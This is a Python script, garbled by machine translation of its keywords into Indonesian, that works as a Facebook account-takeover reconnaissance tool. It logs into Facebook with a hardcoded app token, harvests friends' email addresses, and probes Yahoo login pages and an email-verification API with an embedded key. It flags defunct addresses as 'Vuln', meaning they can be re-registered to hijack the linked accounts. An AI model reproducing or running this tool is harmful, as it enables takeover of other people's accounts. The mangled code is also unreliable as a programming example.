# encoding = utf8
# Penulis: ./DelLuxeZ
permintaan impor
impor xml.dom.minidom sebagai xmlget
impor os
kelas  bcolors :
    HIJAU = ' \ 033 [0; 32m '
    MERAH = ' \ 033 [01; 31m '
    NORMAL = ' \ 033 [0m '
    CYAN = ' \ 033 [0; 36m '
    BIRU = ' \ 033 [0; 34m '
    PUTIH = ' \ 033 [1; 37m '
# Hapus layar
os.system ( ' cls '  if os.name ==  ' nt '  else  ' clear ' )


H =  ' \ 033 [95m '
B =  ' \ 033 [94m '
G =  ' \ 033 [92m '
W =  ' \ 033 [93m '
F =  ' \ 033 [91m '
E =  ' \ 033 [0m '
U =  ' \ 033 [4m '
O =  ' \ 033 [33m '

impor urllib2, sys, re
impor os
impor ssl
waktu impor

def  cls ():
    linux =  ' jelas '
    windows =  ' cls '
    os.system ([linux, windows] [os.name ==  ' nt ' ])

cls ()

os.system ([ ' ' , ' color D ' ] [os.name ==  ' nt ' ])

cetak bcolors. CYAN
cetak  "      ======================================== "
cetak  "                             Tools By ./DelLuxez "
cetak  "      ======================================== "
cetak bcolors. BIRU
cetak  " ------------------------------------------------ ------ "
cetak  " | ~ Alat Info ~ | "
cetak  " | Klon Yahoo Versi Baru | "
print  " | Disandikan Oleh: ./DelLuxeZ | "
print "| Tanggal: Selasa-02-2019 
print "| Facebook: ImanuelTaroreh |" Aris Herdiawan
print "| Versi: 0.1 |"
cetak  " | Jangan Gunakan Secara Ilegal | "
cetak  " ------------------------------------------------ ------ "


permintaan impor , json, os, re, sys, mekanisasi, urllib
memuat ulang (sys)
sys.setdefaultencoding ( ' utf8 ' )
br = mechanize.Browser ()
br.set_handle_robots ( False )
os.system ( " clear " )
idt =  raw_input ( " \ 033 [39m [ \ 033 [31m * \ 033 [39m] Email: " )
passw =  raw_input ( " \ 033 [39m [ \ 033 [31m * \ 033 [39m] Kata Sandi: " )
url =  " https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email= "  + (idt) +  " & locale = en_US & password = "  + (sandi batasan) +  " & sdk = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 "
data = urllib.urlopen (url)
op = json.load (data)
jika  ' access_token '  di op:
    token = (op [ " access_token " ])
    cetak ( " \ 033 [39m [ \ 033 [31m + \ 033 [39m] Login Berhasil " )
lain :
    cetak ( " \ 033 [39m [ \ 033 [31m + \ 033 [39m] \ 033 [31mGog Gagal! " )
    sys.exit ()
get_friends = requests.get ( ' https://graph.facebook.com/me/friends?access_token= ' + token)
hasil = json.loads (get_friends.text)
cetak ( " \ 033 [39m [ \ 033 [31m + \ 033 [39m] Berhasil Mendapatkan ID Teman ... " )
# cok = terbuka ('Mail_Yahoo.txt', 'w')
def  pertahanan ():
    global o, h
    o = []
    h =  0
    cetak  " \ 033 [36m "  +  55 * " - "
    cetak  " \ 033 [36m | "  +  11 * "  "  +  " \ 033 [35mEmail "  +  14 * "  "  +  " \ 033 [36m | "  +  9 * "  "  +  " \ " 033 [33mVuln "  +  8 * "  "  +  " \ 033 [36m | "
    cetak  55 * " - "
    untuk saya di hasil [ ' data ' ]:
        wrna =  " \ 033 [36m "
        wrne =  " \ 033 [39m "
        h + = 1
        o.menambahkan (h)
        x = requests.get ( " https://graph.facebook.com/ " + i [ ' id ' ] + " ? access_token = " + token)
        z = json.loads (x.text)
        coba :
            kunci = re.compile ( r ' @ . * ' )
            cari = kunci.search (z [ ' email ' ]). group ()
            if  ' yahoo.com '  di cari:
                br.open ( " https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com " )
                br._factory.is_html =  Benar
                br.select_form ( nr = 0 )
                br [ " username " ] = z [ ' email ' ]
                j = br.submit (). read ()
                Zen = mengkompilasi ulang ( r ' "pesan . ERROR_INVALID_USERNAME"> . * ' )
                coba :
                    cd = Zen.search (j) .group ()
                kecuali :
                    vuln =  6 * "  "  +  " \ 033 [31mNdak Vuln "
                    # Email Len
                    lean =  30  - ( len (z [ ' email ' ]))
                    eml = lean *  "  "
                    # Beri nama Len
                    lone =  24  - ( len (vuln))
                    namel = lone *  "  "
                    cetak  " \ 033 [36m | "  + wrna + z [ ' email ' ] + eml +  " \ 033 [36m | "  + wrne + vuln + namel +  "  \ 033 [36m | "
                    terus
                jika  ' "messages.ERROR_INVALID_USERNAME"> '  di cd:
                    vuln =  8 * "  "  +  " \ 033 [32mVuln "
                lain :
                    vuln =  5 * "  "  +  " \ 033 [31mNdak Vuln "
                # bagus
                lean =  30  - ( len (z [ ' email ' ]))
                eml = lean *  "  "
                lone =  24  - ( len (vuln))
                namel = lone *  "  "
                cetak  " \ 033 [36m | "  + wrna + z [ ' email ' ] + eml +  " \ 033 [36m | "  + wrne + vuln + namel +  "  \ 033 [36m | "
            elif  ' hotmail '  di cari:
                url = ( " http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email= "  + z [ ' email ' ] +  " & smtp = 1 & format = 1 " )
                cek = json.loads (requests.get (url) .text)
                jika cek [ ' smtp_check ' ] ==  0 :
                    vuln =  8 * "  "  +  " \ 033 [32mVuln "

                lain :
                    vuln =  5 * "  "  +  " \ 033 [31mNdak Vuln "
                lean =  30  - ( len (z [ ' email ' ]))
                eml = lean *  "  "
                # Nama I./DelLuxeZ
                # Penulis: ImanuelTaroreh
                lone =  24  - ( len (vuln))
                namel = lone *  "  "
                cetak  " \ 033 [36m | "  + wrna + z [ ' email ' ] + eml +  " \ 033 [36m |   "  + wrne + vuln + namel +  " \ 033 [36m | "
            lain :
                lulus
        kecuali  KeyError :
            lulus
pertahanan()
